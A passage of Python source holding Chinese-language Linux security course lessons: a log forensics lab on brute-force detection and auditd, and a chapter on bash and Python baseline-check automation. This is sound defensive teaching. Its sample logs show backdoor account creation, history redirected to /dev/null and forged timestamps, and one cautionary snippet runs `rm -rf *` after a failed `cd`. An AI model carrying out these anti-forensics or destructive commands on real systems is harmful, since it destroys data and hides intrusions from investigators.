<text x="577" y="154" text-anchor="middle" fill="#64748b" font-size="10">關聯分析 · 告警</text>
<text x="577" y="170" text-anchor="middle" fill="#64748b" font-size="10">WORM 長期保存</text>
<text x="340" y="266" text-anchor="middle" fill="#fbbf24" font-size="12" font-weight="700">核心原則：關鍵紀錄不能存放在被記錄者能控制的地方</text>
<text x="340" y="288" text-anchor="middle" fill="#94a3b8" font-size="11">額外告警：某台主機「日誌量突然下降」本身就是重大異常</text>
</svg>""",
    "labs": [{
        "title": "日誌調查與稽核設定",
        "goal": "從日誌重建攻擊時間軸，並確認稽核機制有效。",
        "warn": "查詢類指令安全。auditd 規則變更會影響效能，請在測試機驗證。",
        "steps": [
            {"cmd": "sudo lastb | head -8",
             "explain": "看失敗登入紀錄（讀 /var/log/btmp）。大量同來源失敗 = 暴力破解。",
             "output": "admin    ssh:notty    203.0.113.9      Tue Jul 30 09:46 - 09:46  (00:00)\nadmin    ssh:notty    203.0.113.9      Tue Jul 30 09:46 - 09:46  (00:00)\nroot     ssh:notty    203.0.113.9      Tue Jul 30 09:45 - 09:45  (00:00)\nroot     ssh:notty    203.0.113.9      Tue Jul 30 09:45 - 09:45  (00:00)\ntest     ssh:notty    203.0.113.9      Tue Jul 30 09:44 - 09:44  (00:00)\noracle   ssh:notty    203.0.113.9      Tue Jul 30 09:44 - 09:44  (00:00)\n\nbtmp begins Tue Jul 30 09:14:02 2026"},
            {"cmd": "sudo grep -E 'Accepted (password|publickey)' /var/log/auth.log | tail -5",
             "explain": "**最關鍵的查詢**：誰成功登入了。與失敗紀錄的 IP 交叉比對。",
             "output": "Jul 30 08:02:11 srv sshd[2201]: Accepted publickey for tom from 10.10.99.7 port 52201 ssh2: RSA SHA256:aB3...\nJul 30 09:47:31 srv sshd[4102]: Accepted password for deploy from 203.0.113.9 port 51422 ssh2\n# 第二筆：來源 IP 與暴力破解的 IP 相同，且是密碼登入 → 已被攻破"},
            {"cmd": "sudo grep -E 'useradd|usermod|groupadd|group_add' /var/log/auth.log",
             "explain": "帳號建立與變更事件。UID=0 的新帳號應該觸發最高等級告警。",
             "output": "Jul 30 09:48:11 srv useradd[4155]: new user: name=backupsvc, UID=0, GID=0, home=/root, shell=/bin/bash\nJul 30 09:48:12 srv usermod[4158]: add 'backupsvc' to group 'sudo'\n# 建立 UID=0 的帳號並加入 sudo → 明確的後門建立行為"},
            {"cmd": "sudo journalctl -u ssh --since '2026-07-30 09:40' --until '2026-07-30 10:00' --no-pager | head -10",
             "explain": "用時間範圍框住可疑窗口，只看該區間的日誌。",
             "output": "Jul 30 09:45:02 srv sshd[4021]: Failed password for root from 203.0.113.9 port 51388 ssh2\nJul 30 09:46:18 srv sshd[4055]: Failed password for invalid user admin from 203.0.113.9 port 51401 ssh2\nJul 30 09:47:31 srv sshd[4102]: Accepted password for deploy from 203.0.113.9 port 51422 ssh2\nJul 30 09:47:31 srv sshd[4102]: pam_unix(sshd:session): session opened for user deploy(uid=1001)\nJul 30 09:49:02 srv sshd[4102]: pam_unix(sshd:session): session closed for user deploy"},
            {"cmd": "stat /tmp/.kdevtmpfsi",
             "explain": "**取證重點**：比對 Modify 與 Change 時間。"
                        "mtime 遠早於 ctime = 時間戳被偽造。",
             "output": "  File: /tmp/.kdevtmpfsi\n  Size: 2891264   Blocks: 5648   IO Block: 4096   regular file\nAccess: 2026-07-30 10:41:02.000000000 +0000\nModify: 2024-01-15 08:00:00.000000000 +0000\nChange: 2026-07-30 10:38:22.441029183 +0000\n Birth: 2026-07-30 10:38:22.441029183 +0000\n# Modify 被偽造成 2024 年，但 Change（inode 變更）與 Birth 顯示真實時間\n# ctime 幾乎無法用一般工具偽造 → 這是取證的重要依據"},
            {"cmd": "sudo ausearch -k identity -ts today -i | head -8",
             "explain": "查詢 auditd 針對 /etc/passwd、/etc/shadow 的存取紀錄。",
             "output": "type=SYSCALL msg=audit(07/30/2026 09:48:11.204:1882) : arch=x86_64 syscall=openat success=yes exit=4 a0=0xffffff9c items=1 ppid=4102 pid=4155 auid=deploy uid=root gid=root euid=root comm=useradd exe=/usr/sbin/useradd key=identity\ntype=PATH msg=audit(07/30/2026 09:48:11.204:1882) : item=0 name=/etc/passwd inode=2621443 mode=file,644 ouid=root ogid=root\n# auid=deploy 是關鍵：即使提權成 root，auid（原始登入身分）仍記錄真正的人"},
            {"cmd": "sudo auditctl -s",
             "explain": "確認 auditd 狀態與規則是否被鎖定（enabled 2 = 已鎖定）。",
             "output": "enabled 1\nfailure 1\npid 892\nrate_limit 0\nbacklog_limit 8192\nlost 0\nbacklog 0\nbacklog_wait_time 60000\n# enabled 1 表示啟用但未鎖定 → 攻擊者取得 root 後可用 auditctl -D 清空規則\n# 建議在規則檔尾端加上 -e 2 鎖定"},
            {"cmd": "ls -la ~/.bash_history; sudo ls -la /root/.bash_history",
             "explain": "檢查指令歷史是否被清除或改指向 /dev/null。",
             "output": "-rw------- 1 tom tom 8241 Jul 30 08:02 /home/tom/.bash_history\nlrwxrwxrwx 1 root root 9 Jul 30 09:52 /root/.bash_history -> /dev/null\n# root 的歷史被連結到 /dev/null → 明確的反取證行為"},
            {"cmd": "sudo journalctl --disk-usage; grep -E '^Storage' /etc/systemd/journald.conf",
             "explain": "**確認日誌有持久化**。journald 預設是暫存，重開機就消失。",
             "output": "Archived and active journals take up 24.0M in the file system.\n#Storage=auto\n# Storage 被註解 = 使用預設 auto：只有 /var/log/journal 存在時才持久化\n# 應明確設定 Storage=persistent 並設定 MaxRetentionSec"},
            {"cmd": "grep -E '^\\*\\.\\*|@@' /etc/rsyslog.conf /etc/rsyslog.d/*.conf 2>/dev/null",
             "explain": "**最重要的一項檢查**：日誌有沒有外送到遠端。@@ 代表用 TCP（可靠）。",
             "output": "/etc/rsyslog.d/50-remote.conf:*.* @@logcollector.internal:6514\n# 有設定外送到遠端收集器（TCP + 應搭配 TLS）\n# 這代表即使本機日誌被刪，遠端仍保有一份"},
        ],
    }],
    "quiz": [
        {"q": "systemd-journald 的預設儲存行為是什麼？為什麼這是資安問題？",
         "options": ["永久儲存，沒有問題", "預設可能只存在記憶體，重開機就消失，導致失去調查能力",
                     "自動加密", "只存錯誤訊息"],
         "answer": 1,
         "why": "需明確設定 Storage=persistent 並建立 /var/log/journal。"
                "入侵到被發現的中位數以數十天計，日誌只留幾天等於沒有調查能力。"},
        {"q": "日誌顯示同一個 IP 先出現大量 `Failed password`，隨後出現 `Accepted password`。這代表什麼？",
         "options": ["使用者忘記密碼", "暴力破解成功，該帳號已被攻破，必須立即處置",
                     "網路不穩", "正常的重試"],
         "answer": 1,
         "why": "這是最危險的日誌模式之一。應立即停用該帳號、封鎖 IP、檢查該 session 後續行為。"},
        {"q": "auditd 規則檔加上 `-e 2` 的作用是？",
         "options": ["提高效能", "鎖定稽核規則，直到重開機都無法修改，防止攻擊者取得 root 後關閉稽核",
                     "只記錄錯誤", "啟用加密"],
         "answer": 1,
         "why": "體現「關鍵紀錄不能存放在被記錄者能控制的地方」原則。"
                "攻擊者必須重開機才能改規則，而重開機本身就是明顯事件。"},
        {"q": "檔案的 `Modify` 時間顯示 2024 年，但 `Change` 時間是今天。這說明什麼？",
         "options": ["檔案很舊", "mtime 被偽造，ctime（inode 變更時間）幾乎無法用一般工具偽造，是取證依據",
                     "檔案損壞", "時區設定錯誤"],
         "answer": 1,
         "why": "`touch -t` 可改 mtime/atime 但不能改 ctime。這個不一致是時間戳偽造的明確指標。"},
        {"q": "在 auditd 紀錄中，`auid` 欄位的價值是什麼？",
         "options": ["記錄檔案大小", "記錄「原始登入身分」，即使使用者提權成 root 也追得到真正是誰",
                     "記錄 IP 位址", "記錄執行時間"],
         "answer": 1,
         "why": "auid (audit UID) 在整個 session 中不變。這解決了「大家都用 sudo 變成 root，"
                "無法分辨是誰」的稽核問題。"},
        {"q": "為什麼「某台主機的日誌量突然大幅下降」應該設成告警？",
         "options": ["節省儲存空間", "沉默本身是最大的異常 — 可能代表日誌被關閉、清除或服務被破壞",
                     "代表系統很穩定", "與資安無關"],
         "answer": 1,
         "why": "時間軸上的空白比異常紀錄更可疑。攻擊者的第一步常是關掉監視。"},
        {"q": "防止攻擊者刪除日誌，最有效的措施是？",
         "options": ["把日誌設成唯讀", "即時外送到獨立的遠端收集器或 SIEM，讓本機被刪也還有一份",
                     "增加磁碟容量", "每天手動備份"],
         "answer": 1,
         "why": "本機的任何保護在 root 權限下都可能被繞過。外送是唯一可靠的方案，"
                "搭配 WORM 儲存更佳。"},
        {"q": "`last` 與 `lastb` 分別讀取哪個檔案？",
         "options": ["auth.log 與 syslog", "wtmp（成功登入）與 btmp（失敗登入）",
                     "messages 與 kern.log", "journal 與 audit.log"],
         "answer": 1,
         "why": "兩者都是二進位檔，用 cat 會亂碼，必須用專用指令。lastlog 則記錄每個帳號最後登入時間。"},
        {"q": "多台主機的日誌時間不同步，最直接的後果是？",
         "options": ["佔用更多空間", "無法把不同主機的事件串成正確的攻擊時間軸，嚴重影響取證",
                     "日誌會遺失", "無法壓縮"],
         "answer": 1,
         "why": "時間同步（NTP/chrony + 統一 UTC）是取證與稽核的基本前提，也是法規常見要求。"},
        {"q": "`sudo chattr +a /var/log/auth.log` 的效果是？",
         "options": ["加密檔案", "設為只能附加 (append-only)，連 root 都不能覆寫或刪除，除非先移除該屬性",
                     "壓縮檔案", "設為唯讀"],
         "answer": 1,
         "why": "增加攻擊者清理日誌的難度，且移除屬性的動作本身可被 auditd 記錄。"
                "注意會影響 logrotate，需調整輪替設定。"},
    ],
    "keywords": ["日誌", "journalctl", "auth.log", "syslog", "rsyslog", "auditd",
                 "ausearch", "auid", "wtmp", "btmp", "last", "lastb", "時間軸",
                 "反取證", "chattr", "NTP", "日誌集中化", "WORM"],
    "takeaway": [
        "journald 預設可能不持久化 — 必須明確設定 Storage=persistent 與保留期。",
        "關鍵紀錄不能存放在被記錄者能控制的地方；即時外送是唯一可靠方案。",
        "ctime 幾乎無法偽造，是判斷時間戳造假的取證依據；auid 能追出提權前的真正身分。",
    ],
})

CH.append({
    "id": "l06",
    "title": "Shell 腳本與資安自動化",
    "subtitle": "bash 基礎、寫出自己的巡檢腳本、Python 輔助",
    "level": "進階",
    "minutes": 22,
    "summary": "手工檢查一台機器要十分鐘，五百台就不可能。會寫腳本，你的能力才能規模化。",
    "why": "腳本就是**把你的檢查清單變成一個按鈕**。"
           "同樣一份檢查，手工做會忘記步驟、會偷懶、每次結果不一致；"
           "腳本每次都做完全部項目，而且可以排程每天跑。"
           "**資安人員和資安工程師的差別，就在於後者會把工作變成程式。**",
    "sections": [
        {
            "heading": "bash 腳本必備七件事",
            "body": "**1. 檔頭與嚴格模式**\n"
                    "```bash\n"
                    "#!/usr/bin/env bash\n"
                    "set -euo pipefail\n"
                    "```\n"
                    "- `-e` 有指令失敗就停止（避免錯誤被忽略後繼續跑）\n"
                    "- `-u` 使用未定義變數就報錯（避免打錯變數名）\n"
                    "- `-o pipefail` 管道中任一環失敗都算失敗\n"
                    "**這三個是專業腳本的最低標準。**\n\n"
                    "**2. 變數**：`NAME=\"value\"`（等號兩邊不能有空格），"
                    "用 `\"${NAME}\"` 引用（**一定要加雙引號**，避免空白與特殊字元出問題）\n\n"
                    "**3. 條件判斷**\n"
                    "```bash\n"
                    "if [[ -f \"$FILE\" ]]; then ... fi      # 檔案存在\n"
                    "if [[ -d \"$DIR\" ]]; then ... fi       # 目錄存在\n"
                    "if [[ \"$A\" == \"$B\" ]]; then ... fi    # 字串相等\n"
                    "if (( COUNT > 10 )); then ... fi       # 數字比較\n"
                    "if ! command -v nmap &>/dev/null; then ... fi   # 指令不存在\n"
                    "```\n\n"
                    "**4. 迴圈**\n"
                    "```bash\n"
                    "for host in 10.0.0.{1..20}; do ... done\n"
                    "while read -r line; do ... done < hosts.txt\n"
                    "```\n\n"
                    "**5. 函式**、**6. 參數**（`$1 $2 $@ $#`）、"
                    "**7. 離開碼**（`exit 0` 成功、非 0 失敗）",
            "example": "**為什麼 `set -euo pipefail` 這麼重要**：\n\n"
                       "沒有它的腳本：\n"
                       "```bash\n"
                       "#!/bin/bash\n"
                       "cd /var/backup/data     # 如果這個目錄不存在...\n"
                       "rm -rf *                # ...這行會在你當前目錄執行！\n"
                       "```\n"
                       "**`cd` 失敗後腳本繼續執行，`rm -rf *` 就在錯誤的目錄裡跑。**\n"
                       "這是真實造成過重大事故的模式。\n\n"
                       "加上 `set -e` 後，`cd` 失敗就立刻停止，`rm` 永遠不會執行。\n\n"
                       "**另一個常見錯誤：沒加引號**\n"
                       "```bash\n"
                       "FILE=\"my report.txt\"\n"
                       "rm $FILE       # 錯：變成 rm my 和 rm report.txt\n"
                       "rm \"$FILE\"     # 對\n"
                       "```\n\n"
                       "**建議**：寫完腳本用 **ShellCheck**（`shellcheck script.sh`）檢查，"
                       "它會抓出這類問題。這是 shell 腳本的靜態分析工具。",
            "note": "考點：`#!/usr/bin/env bash` 比 `#!/bin/bash` 更可攜"
                    "（會去 PATH 找 bash，適用於 bash 不在 /bin 的系統）。"
                    "`sh` 與 `bash` 不同，`[[ ]]` 是 bash 專有語法。",
        },
        {
            "heading": "寫一個真正有用的巡檢腳本",
            "body": "**設計原則**：\n"
                    "1. **只讀不改** — 巡檢腳本絕不修改系統，避免造成事故\n"
                    "2. **輸出結構化** — 用固定格式（或 JSON），方便匯入 SIEM 或 Excel\n"
                    "3. **有明確的 PASS/FAIL** — 不要只印出資料，要判斷合不合格\n"
                    "4. **可重複執行** — 每天跑結果應該一致\n"
                    "5. **失敗要有原因** — 說明「為什麼不合格」與「怎麼修」\n\n"
                    "**建議的檢查項目（對應前面所有章節）**：\n"
                    "- SSH 設定（PermitRootLogin、PasswordAuthentication）\n"
                    "- 防火牆是否啟用且預設拒絕\n"
                    "- 待安裝的安全更新數量\n"
                    "- UID 0 的帳號數量\n"
                    "- 沒有密碼的帳號\n"
                    "- 非預期的 SUID 檔案\n"
                    "- 對外監聽的 port\n"
                    "- /tmp 掛載選項\n"
                    "- 日誌是否持久化與外送\n"
                    "- 可疑的 cron 項目",
            "example": "**完整可用的巡檢腳本**（存成 `seccheck.sh`）：\n"
                       "```bash\n"
                       "#!/usr/bin/env bash\n"
                       "set -uo pipefail\n"
                       "\n"
                       "PASS=0; FAIL=0\n"
                       "ok()   { printf '  [ PASS ] %s\\n' \"$1\"; PASS=$((PASS+1)); }\n"
                       "bad()  { printf '  [ FAIL ] %s\\n         → 建議：%s\\n' \"$1\" \"$2\"; FAIL=$((FAIL+1)); }\n"
                       "head1(){ printf '\\n== %s ==\\n' \"$1\"; }\n"
                       "\n"
                       "printf '資安基線巡檢  %s  %s\\n' \"$(hostname)\" \"$(date -Is)\"\n"
                       "\n"
                       "head1 'SSH 設定'\n"
                       "SSHD=$(sudo sshd -T 2>/dev/null)\n"
                       "grep -qi '^permitrootlogin no' <<<\"$SSHD\" \\\n"
                       "  && ok 'root 無法直接 SSH 登入' \\\n"
                       "  || bad 'root 可直接 SSH 登入' 'sshd_config 設 PermitRootLogin no'\n"
                       "grep -qi '^passwordauthentication no' <<<\"$SSHD\" \\\n"
                       "  && ok '已停用密碼登入（僅金鑰）' \\\n"
                       "  || bad '允許密碼登入' '改用金鑰並設 PasswordAuthentication no'\n"
                       "\n"
                       "head1 '帳號安全'\n"
                       "ROOTS=$(awk -F: '$3==0 {c++} END {print c+0}' /etc/passwd)\n"
                       "(( ROOTS == 1 )) \\\n"
                       "  && ok 'UID 0 帳號僅有 root' \\\n"
                       "  || bad \"發現 ${ROOTS} 個 UID 0 帳號\" '檢查是否有後門帳號'\n"
                       "NOPW=$(sudo awk -F: '$2==\"\" {c++} END {print c+0}' /etc/shadow)\n"
                       "(( NOPW == 0 )) \\\n"
                       "  && ok '沒有空密碼帳號' \\\n"
                       "  || bad \"有 ${NOPW} 個帳號沒有密碼\" '立即 passwd -l 鎖定'\n"
                       "\n"
                       "head1 '修補狀態'\n"
                       "UPD=$(apt-get -s upgrade 2>/dev/null | grep -c '^Inst' || echo 0)\n"
                       "(( UPD == 0 )) \\\n"
                       "  && ok '所有套件已是最新' \\\n"
                       "  || bad \"有 ${UPD} 個套件待更新\" '排定維護窗口執行 apt upgrade'\n"
                       "\n"
                       "head1 '檔案系統加固'\n"
                       "findmnt -no OPTIONS /tmp | grep -q noexec \\\n"
                       "  && ok '/tmp 已設 noexec' \\\n"
                       "  || bad '/tmp 可執行檔案' 'fstab 加 noexec,nosuid,nodev'\n"
                       "\n"
                       "head1 '日誌'\n"
                       "grep -rqE '@@?[a-z0-9.]+' /etc/rsyslog.d/ 2>/dev/null \\\n"
                       "  && ok '日誌有外送到遠端' \\\n"
                       "  || bad '日誌僅存本機' '設定 rsyslog 外送至集中收集器'\n"
                       "\n"
                       "printf '\\n───────────────────────\\n通過 %d 項，未通過 %d 項\\n' \"$PASS\" \"$FAIL\"\n"
                       "(( FAIL == 0 )) && exit 0 || exit 1\n"
                       "```\n\n"
                       "**用法**：`chmod +x seccheck.sh && sudo ./seccheck.sh`\n"
                       "**排程**：`0 7 * * * /opt/seccheck.sh | mail -s \"巡檢報告\" you@corp.com`\n\n"
                       "**離開碼設計**：FAIL 時回傳 1，這樣可以接進 CI/CD 或監控系統。",
            "note": "把腳本放進 git、加上版本號、寫上「這個檢查對應哪一條政策」。"
                    "**能追溯到政策的檢查才有稽核價值。**",
        },
        {
            "heading": "用 Python 做更複雜的分析",
            "body": "bash 適合「串接指令」，Python 適合「處理資料與產生報告」。\n\n"
                    "**分工原則**：\n"
                    "- 五行以內、只是串幾個指令 → **bash**\n"
                    "- 需要解析 JSON/CSV、做統計、產生報表、呼叫 API → **Python**\n\n"
                    "**Python 在資安上最常用的標準函式庫**：\n"
                    "- `re` 正規表達式（解析日誌）\n"
                    "- `json` / `csv` 資料格式\n"
                    "- `collections.Counter` 計次（取代 `sort|uniq -c`）\n"
                    "- `ipaddress` IP 與子網計算（**不用手算子網**）\n"
                    "- `hashlib` 雜湊\n"
                    "- `subprocess` 呼叫外部指令\n"
                    "- `datetime` 時間處理\n"
                    "- `pathlib` 檔案路徑",
            "example": "**日誌分析腳本：找出暴力破解來源**\n"
                       "```python\n"
                       "#!/usr/bin/env python3\n"
                       "import re\n"
                       "import ipaddress\n"
                       "from collections import Counter\n"
                       "from pathlib import Path\n"
                       "\n"
                       "LOG = Path('/var/log/auth.log')\n"
                       "THRESHOLD = 20          # 超過幾次算暴力破解\n"
                       "INTERNAL = ipaddress.ip_network('10.0.0.0/8')\n"
                       "\n"
                       "fail_re = re.compile(\n"
                       "    r'Failed password for (?:invalid user )?(\\S+) from (\\d+\\.\\d+\\.\\d+\\.\\d+)')\n"
                       "ok_re = re.compile(\n"
                       "    r'Accepted \\w+ for (\\S+) from (\\d+\\.\\d+\\.\\d+\\.\\d+)')\n"
                       "\n"
                       "fails, users, success = Counter(), Counter(), set()\n"
                       "\n"
                       "with LOG.open(errors='ignore') as f:\n"
                       "    for line in f:\n"
                       "        if m := fail_re.search(line):\n"
                       "            users[m.group(1)] += 1\n"
                       "            fails[m.group(2)] += 1\n"
                       "        elif m := ok_re.search(line):\n"
                       "            success.add((m.group(2), m.group(1)))\n"
                       "\n"
                       "print(f'{\"來源 IP\":<18}{\"失敗次數\":>8}  {\"位置\":<8}判定')\n"
                       "print('-' * 60)\n"
                       "for ip, n in fails.most_common(10):\n"
                       "    where = '內部' if ipaddress.ip_address(ip) in INTERNAL else '外部'\n"
                       "    verdict = '暴力破解' if n >= THRESHOLD else '偶發失敗'\n"
                       "    # 最重要的判斷：這個 IP 後來成功登入了嗎？\n"
                       "    breached = [u for (i, u) in success if i == ip]\n"
                       "    if breached:\n"
                       "        verdict = f'!! 已攻破 → 帳號 {\", \".join(breached)}'\n"
                       "    print(f'{ip:<18}{n:>8}  {where:<8}{verdict}')\n"
                       "\n"
                       "print(f'\\n最常被嘗試的帳號：{\", \".join(u for u, _ in users.most_common(5))}')\n"
                       "```\n\n"
                       "**輸出範例**：\n"
                       "```\n"
                       "來源 IP             失敗次數  位置    判定\n"
                       "------------------------------------------------------------\n"
                       "203.0.113.9           4821  外部    !! 已攻破 → 帳號 deploy\n"
                       "198.51.100.44          913  外部    暴力破解\n"
                       "10.10.10.88             12  內部    偶發失敗\n"
                       "\n"
                       "最常被嘗試的帳號：root, admin, test, oracle, postgres\n"
                       "```\n\n"
                       "**這份輸出可以直接當事件通報的附件。**",
            "note": "`ipaddress` 模組讓子網計算變成一行："
                    "`ipaddress.ip_network('192.168.1.0/26')` 就能拿到"
                    "`network_address`、`broadcast_address`、`num_addresses`、`hosts()`。"
                    "**但你還是要會手算，因為考試不能用 Python。**",
        },
        {
            "heading": "自動化的界線：什麼該自動、什麼不該",
            "body": "**適合自動化**（低風險、高重複）：\n"
                    "- 資訊蒐集與巡檢（唯讀）\n"
                    "- 日誌解析與報表\n"
                    "- 告警的初步分類與資料充實（查 IP 信譽、查檔案雜湊）\n"
                    "- 已確認的低風險處置：封鎖惡意 IP、隔離已確認的惡意檔案\n\n"
                    "**應該保留人工判斷**（高風險、不可逆）：\n"
                    "- **隔離生產伺服器**（可能造成服務中斷）\n"
                    "- **停用高權限帳號**（可能鎖住正在處理事件的人）\n"
                    "- **刪除任何東西**\n"
                    "- 對外通報與法律決定\n\n"
                    "**設計自動化的三個護欄**：\n"
                    "1. **先做「建議模式」再做「執行模式」** — "
                    "新規則先只產生建議，觀察一段時間確認沒有誤判，才開啟自動執行\n"
                    "2. **一定要能回滾** — 自動封鎖要有自動解封與手動覆寫\n"
                    "3. **設速率上限** — 例如「每小時最多自動隔離 3 台」，"
                    "避免誤判造成大規模斷線",
            "example": "**真實會出事的自動化**：\n\n"
                       "某公司設定「偵測到惡意 IP 就自動加入防火牆黑名單」。"
                       "某天威脅情報來源出錯，把 **Microsoft 的更新伺服器 IP** 標成惡意。"
                       "自動化在五分鐘內封鎖了它，結果**全公司電腦無法更新，"
                       "而且 Teams 與 Outlook 全部斷線**。\n\n"
                       "**這個事故告訴我們三件事**：\n"
                       "1. 自動化必須有**白名單**（永不封鎖的關鍵服務）\n"
                       "2. 必須有**速率限制**（一次封鎖上百個 IP 應該先停下來要求人工確認）\n"
                       "3. 必須有**快速回滾**（一個指令解除所有今天的自動封鎖）\n\n"
                       "**自動化不是把人排除，是把人的注意力留給真正需要判斷的事。**\n"
                       "這正是 SOAR 的設計哲學，也是後面 CySA+ 路線會深入的主題。",
            "note": "**冪等性 (Idempotency)**：腳本執行一次和執行十次的結果應該一樣。"
                    "例如加防火牆規則前先檢查「是否已存在」。"
                    "不具冪等性的腳本重複執行會產生重複規則、重複帳號等混亂 — "
                    "這是 Ansible 這類工具的核心設計原則。",
        },
    ],
    "labs": [{
        "title": "建立你自己的巡檢腳本",
        "goal": "從零寫出一個可排程的資安基線檢查工具。",
        "warn": "腳本本身只做查詢，安全。但請先在測試機驗證再放到生產環境排程。",
        "steps": [
            {"cmd": "cat > /tmp/seccheck.sh <<'EOF'\n#!/usr/bin/env bash\nset -uo pipefail\nPASS=0; FAIL=0\nok(){ printf '  [PASS] %s\\n' \"$1\"; PASS=$((PASS+1)); }\nbad(){ printf '  [FAIL] %s → %s\\n' \"$1\" \"$2\"; FAIL=$((FAIL+1)); }\nprintf '巡檢 %s %s\\n' \"$(hostname)\" \"$(date -Is)\"\nEOF\nchmod +x /tmp/seccheck.sh && echo '骨架已建立'",
             "explain": "先建立腳本骨架：嚴格模式、計數器、輸出函式。**所有巡檢腳本都是這個結構。**",
             "output": "骨架已建立"},
            {"cmd": "bash -n /tmp/seccheck.sh && echo '語法檢查通過'",
             "explain": "`bash -n` 只檢查語法不執行 — 相當於腳本的 lint。改完一定要跑。",
             "output": "語法檢查通過"},
            {"cmd": "shellcheck /tmp/seccheck.sh",
             "explain": "**ShellCheck 是 shell 腳本的靜態分析工具**，會抓出未加引號、"
                        "可能的邏輯錯誤等問題。專業腳本都應通過它。",
             "output": "\nIn /tmp/seccheck.sh line 3:\nPASS=0; FAIL=0\n^-- SC2034: PASS appears unused. Verify use (or export if used externally).\n\nFor more information:\n  https://www.shellcheck.net/wiki/SC2034\n# 這個提示可忽略（後面會用到），但真實錯誤務必修正"},
            {"cmd": "sudo sshd -T | grep -qi '^permitrootlogin no' && echo 'PASS: root 無法 SSH' || echo 'FAIL: 應設 PermitRootLogin no'",
             "explain": "單一檢查項目的完整寫法：查詢 → 判斷 → 輸出結論。把這種行組合起來就是腳本。",
             "output": "FAIL: 應設 PermitRootLogin no"},
            {"cmd": "awk -F: '$3==0 {c++} END {printf \"UID 0 帳號數：%d %s\\n\", c, (c==1 ? \"(正常)\" : \"(異常，可能有後門)\")}' /etc/passwd",
             "explain": "在 awk 裡直接做判斷並輸出結論，比在 bash 裡處理更簡潔。",
             "output": "UID 0 帳號數：2 (異常，可能有後門)"},
            {"cmd": "python3 -c \"\nimport ipaddress\nn = ipaddress.ip_network('192.168.1.0/26')\nprint('網段     :', n)\nprint('網路位址 :', n.network_address)\nprint('廣播位址 :', n.broadcast_address)\nprint('可用主機 :', n.num_addresses - 2)\nprint('第一台   :', list(n.hosts())[0])\nprint('最後一台 :', list(n.hosts())[-1])\n\"",
             "explain": "**用 Python 驗算子網**。前面手算的結果應該完全一致。",
             "output": "網段     : 192.168.1.0/26\n網路位址 : 192.168.1.0\n廣播位址 : 192.168.1.63\n可用主機 : 62\n第一台   : 192.168.1.1\n最後一台 : 192.168.1.62"},
            {"cmd": "python3 -c \"\nimport re\nfrom collections import Counter\nlines = open('/var/log/auth.log', errors='ignore')\nrx = re.compile(r'Failed password for (?:invalid user )?(\\S+) from (\\d+\\.\\d+\\.\\d+\\.\\d+)')\nips, users = Counter(), Counter()\nfor L in lines:\n    m = rx.search(L)\n    if m:\n        users[m.group(1)] += 1\n        ips[m.group(2)] += 1\nfor ip, n in ips.most_common(3):\n    print(f'{ip:<18}{n:>6} 次失敗')\nprint('最常被試的帳號:', [u for u,_ in users.most_common(5)])\n\"",
             "explain": "Python 版的日誌分析：一次取得 IP 與帳號兩個維度，比 bash 更容易擴充。",
             "output": "203.0.113.9         4821 次失敗\n198.51.100.44        913 次失敗\n192.0.2.117          277 次失敗\n最常被試的帳號: ['root', 'admin', 'test', 'oracle', 'postgres']"},
            {"cmd": "(crontab -l 2>/dev/null; echo '0 7 * * * /opt/seccheck.sh >> /var/log/seccheck.log 2>&1') | crontab - && crontab -l | tail -2",
             "explain": "**把腳本排程每天早上七點執行**並記錄輸出。這才叫自動化。"
                        "注意用 `(crontab -l; echo ...) | crontab -` 才不會覆蓋既有項目。",
             "output": "0 3 * * * /usr/local/bin/backup.sh\n0 7 * * * /opt/seccheck.sh >> /var/log/seccheck.log 2>&1"},
        ],
    }],
    "quiz": [
        {"q": "`set -euo pipefail` 中的 `-e` 作用是？為什麼重要？",
         "options": ["顯示執行的指令", "任一指令失敗就立即停止腳本，避免在錯誤狀態下繼續執行破壞性操作",
                     "啟用除錯模式", "忽略錯誤"],
         "answer": 1,
         "why": "經典事故：`cd /backup` 失敗後 `rm -rf *` 在錯誤目錄執行。"
                "`-e` 讓腳本在 cd 失敗時就停下來。"},
        {"q": "為什麼變數引用一定要寫成 `\"$FILE\"` 而不是 `$FILE`？",
         "options": ["比較好看", "沒有引號時含空白的值會被拆成多個參數，造成意外行為",
                     "加引號比較快", "不加引號會語法錯誤"],
         "answer": 1,
         "why": "`FILE=\"my report.txt\"; rm $FILE` 會變成刪兩個檔案。"
                "ShellCheck 會抓出這類問題。"},
        {"q": "巡檢腳本的第一設計原則應該是？",
         "options": ["盡量自動修復問題", "只讀不改 — 避免巡檢本身造成事故",
                     "輸出越詳細越好", "執行速度最快"],
         "answer": 1,
         "why": "巡檢與修復應分開。混在一起時，一個判斷錯誤就會在數百台機器上造成破壞。"},
        {"q": "腳本的「冪等性 (Idempotency)」指的是什麼？",
         "options": ["執行速度快", "執行一次和執行多次的結果相同，例如新增規則前先檢查是否已存在",
                     "可以並行執行", "不需要權限"],
         "answer": 1,
         "why": "不具冪等性的腳本重複執行會產生重複規則、重複帳號。"
                "這是 Ansible 等組態管理工具的核心設計原則。"},
        {"q": "下列哪一項最不適合完全自動化處置？",
         "options": ["查詢可疑 IP 的信譽評分", "自動隔離生產資料庫伺服器",
                     "產生每日巡檢報表", "自動查詢檔案雜湊是否為已知惡意"],
         "answer": 1,
         "why": "隔離生產伺服器可能造成重大服務中斷。高風險、不可逆的動作應保留人工判斷，"
                "或至少要有速率限制與快速回滾。"},
        {"q": "自動封鎖惡意 IP 的機制誤把雲端服務 IP 封掉，導致全公司斷線。應加入哪三個護欄？",
         "options": ["更快的網路、更多頻寬、更大硬碟",
                     "白名單（永不封鎖的關鍵服務）、速率限制、一鍵回滾",
                     "更多的告警、更長的日誌、更多人力", "關閉自動化"],
         "answer": 1,
         "why": "自動化必須設計失敗模式。新規則也應先跑「建議模式」觀察誤判率，再開啟自動執行。"},
        {"q": "什麼情況該用 Python 而非 bash？",
         "options": ["任何情況都用 Python", "需要解析 JSON/CSV、做統計、產生報表或呼叫 API 時",
                     "只有 root 才能用 Python", "bash 已被淘汰"],
         "answer": 1,
         "why": "bash 適合串接指令（五行以內），Python 適合處理資料結構與產生報告。"
                "選對工具比堅持一種語言重要。"},
        {"q": "`bash -n script.sh` 的作用是？",
         "options": ["以 root 執行", "只做語法檢查不實際執行，相當於腳本的 lint",
                     "在背景執行", "顯示行號"],
         "answer": 1,
         "why": "改完腳本應先 `bash -n` 檢查語法，再用 `shellcheck` 做靜態分析，最後才在測試環境執行。"},
    ],
    "keywords": ["bash", "shell 腳本", "set -euo pipefail", "ShellCheck", "巡檢腳本",
                 "Python", "ipaddress", "Counter", "冪等性", "自動化", "SOAR", "cron 排程"],
    "takeaway": [
